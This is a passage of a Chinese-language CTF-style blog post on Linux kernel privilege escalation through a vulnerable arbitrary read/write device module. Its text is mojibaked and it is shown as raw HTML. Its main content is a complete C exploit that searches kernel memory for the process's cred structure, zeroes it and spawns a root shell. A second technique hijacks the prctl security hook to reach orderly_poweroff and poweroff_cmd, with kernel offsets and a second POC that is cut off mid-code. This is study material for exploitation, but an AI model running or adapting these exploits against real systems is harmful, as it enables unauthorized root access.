class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -o exp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> addr;</span><br><span class="line">    <span class="keyword">ssize_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span> <span class="title">arbWriteObj</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="keyword">int</span> addrFD;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="keyword">size_t</span> addr=<span class="number">0xffff880000000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line">    <span class="keyword">size_t</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> root_cred[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set comm[TASK_COMM_LEN]</span></span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/arbWriteModule&quot;</span>;</span><br><span class="line">    devFD = openDev(pos);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//search target chr</span></span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">        result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (result)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">            cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">            real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">            <span class="comment">// if ((cred||0xff00000000000000) &amp;&amp; (real_cred == cred))</span></span><br><span class="line">            <span class="comment">// &#123;</span></span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arbitrary_write(devFD,<span class="number">28</span>,root_cred,real_cred);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((devFD = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> devFD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">111</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">222</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h4 id="â–²æ³¨æ„äº‹é¡¹"   >
          <a href="#â–²æ³¨æ„äº‹é¡¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ³¨æ„äº‹é¡¹" class="headerlink" title="â–²æ³¨æ„äº‹é¡¹"></a>â–²æ³¨æ„äº‹é¡¹</h4>
      <p>ä¸è¿‡è¿™ä¸ªå¦‚æœä¸åŠ åˆ¤æ–­ <code>if ((cred||0xff00000000000000) &amp;&amp; (real_cred == cred))</code>æœç´¢å‡ºæ¥çš„credå¯èƒ½å°±ä¸æ˜¯å½“å‰è¿›ç¨‹ï¼Œå…·æœ‰ä¸€å®šæ¦‚ç‡æ€§ï¼Œå…·ä½“åŸå› ä¸çŸ¥ï¼Œå¯èƒ½æ˜¯æœç´¢åˆ°äº†ç”¨æˆ·è¿›ç¨‹ä¸‹çš„å­—ç¬¦ä¸²ï¼Ÿ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020165201.png" alt="image-20211020165201267"></p>

        <h3 id="3-åŠ«æŒprctlå‡½æ•°"   >
          <a href="#3-åŠ«æŒprctlå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ«æŒprctlå‡½æ•°" class="headerlink" title="3.åŠ«æŒprctlå‡½æ•°"></a>3.åŠ«æŒprctlå‡½æ•°</h3>
      
        <h4 id="1-å‡½æ•°è°ƒç”¨é“¾"   >
          <a href="#1-å‡½æ•°è°ƒç”¨é“¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‡½æ•°è°ƒç”¨é“¾" class="headerlink" title="(1)å‡½æ•°è°ƒç”¨é“¾"></a>(1)å‡½æ•°è°ƒç”¨é“¾</h4>
      <p><code>prctl</code>-&gt;<code>security_task_prctl</code>-&gt;<code>*prctl_hook</code></p>
<p><code>orderly_poweroff</code>-&gt;<code>__orderly_poweroff</code>-&gt;<code>run_cmd(poweroff_cmd)</code>-&gt; <code>call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</code></p>

        <h4 id="2-å‰ç½®çŸ¥è¯†"   >
          <a href="#2-å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‰ç½®çŸ¥è¯†" class="headerlink" title="(2)å‰ç½®çŸ¥è¯†"></a>(2)å‰ç½®çŸ¥è¯†</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021000904.png" alt="image-20211021000903293"></p>
<p>åŸæœ¬capability_hooks+440å­˜æ”¾çš„æ˜¯cap_task_prctlçš„åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001258.png" alt="image-20211021001258001"></p>
<p>ä½†æ˜¯ç»è¿‡æˆ‘ä»¬çš„åŠ«æŒä¹‹åå­˜æ”¾çš„æ˜¯orderly_poweroffçš„åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001355.png" alt="image-20211021001355490"></p>
<p>ä¹‹å‰è®²çš„prctl_hookæŒ‡çš„å°±æ˜¯capability_hooks+440ã€‚</p>
<p>è¿™æ ·åŠ«æŒä¹‹åæˆ‘ä»¬å°±èƒ½è°ƒç”¨åˆ°orderly_poweroffå‡½æ•°äº†ã€‚</p>
<p>è€Œorderly_poweroffå‡½æ•°ä¸­ä¼šè°ƒç”¨å®é™…__orderly_poweroffå‡½æ•°ï¼Œæœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//version 4.4.72</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">		pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment">		 * poweroff asap.  Or not even bother syncing if we&#x27;re doing an</span></span><br><span class="line"><span class="comment">		 * emergency shutdown?</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_power_off();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±è°ƒç”¨åˆ°run_cmd(poweroff_cmd)ï¼Œè€Œrun_cmdå‡½æ•°æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//version 4.4.72</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> **argv;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (argv) &#123;</span><br><span class="line">		ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">		argv_free(argv);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±è°ƒç”¨åˆ°call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)ï¼Œè¿™é‡Œçš„å‚æ•°rdiä¸­å°±æ˜¯</p>
<p>poweroff_cmdã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥åŠ«æŒpoweroff_cmdä¸ºæˆ‘ä»¬çš„ç¨‹åºåå­—å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨call_usermodehelpeå‡½æ•°æ¥å¯åŠ¨æˆ‘ä»¬çš„ç¨‹åºã€‚è€Œpoweroff_cmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–åœ°å€è¿›è¡Œä¿®æ”¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021002640.png" alt="image-20211021002640262"></p>
<p>è€Œcall_usermodehelpeå‡½æ•°å¯åŠ¨ç¨‹åºæ—¶æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬çš„ç¨‹åºè¿è¡Œ/bin/shä¸”ä»¥rootæƒé™å¯åŠ¨ï¼Œé‚£ä¹ˆå°±å®Œæˆäº†ææƒã€‚</p>

        <h4 id="3-è·å–åœ°å€"   >
          <a href="#3-è·å–åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·å–åœ°å€" class="headerlink" title="(3)è·å–åœ°å€"></a>(3)è·å–åœ°å€</h4>
      
        <h5 id="â‘ prctl-hook"   >
          <a href="#â‘ prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ prctl-hook" class="headerlink" title="â‘ prctl_hook"></a>â‘ prctl_hook</h5>
      <p>å¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªå°ç¨‹åºï¼Œç„¶åç»™<code>security_task_prctl</code>å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°<code>call QWORD PTR[rbx+0x18]</code>å³å¯çœ‹åˆ°å¯¹åº”çš„rbx+0x18ä¸Šå­˜æ”¾çš„åœ°å€ï¼Œå°†å…¶ä¿®æ”¹ä¸º<code>orderly_poweroff</code>å‡½æ•°å³å¯ã€‚</p>

        <h5 id="â‘¡poweroff-cmdã€orderly-poweroff"   >
          <a href="#â‘¡poweroff-cmdã€orderly-poweroff" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡poweroff-cmdã€orderly-poweroff" class="headerlink" title="â‘¡poweroff_cmdã€orderly_poweroff"></a>â‘¡poweroff_cmdã€orderly_poweroff</h5>
      <p>å¯ä»¥ç›´æ¥ä½¿ç”¨nmå‘½ä»¤æ¥è·å–ï¼Œæˆ–è€…ç›´æ¥è¿›å…¥gdbæ‰“å°å³å¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105503.png" alt="image-20211021105456058"></p>
<p>æ­¤å¤–orderly_poweroffä¹Ÿæ˜¯ä¸€æ ·çš„è·å–ã€‚å¦‚æœæ— æ³•æŸ¥åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥å¯åŠ¨qemuï¼Œå…ˆè®¾ç½®ä¸ºrootæƒé™å</p>
<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>å³å¯ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105603.png" alt="image-20211021105603666"></p>
<p>â–²æœ€åforkä¸€ä¸ªå­è¿›ç¨‹æ¥è§¦å‘åå¼¹shellå³å¯</p>

        <h4 id="POC-2"   >
          <a href="#POC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ffffffff812adb90 T security_task_prctl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//poweroffå­—ç¬¦ä¸²çš„åç§»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POWEROFF_CMD 0xe39c40</span></span><br><span class="line"><span class="comment">//orderly_poweroffå‡½æ•°çš„åç§»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORDERLY_POWEROFF 0x070060</span></span><br><span class="line"><span class="comment">//prctl_hookçš„åç§»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRCTL_HOOK 0xe7c7d8;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> addr;</span><br><span class="line">    <span class="keyword">ssize_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span> <span class="title">arbWriteObj</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 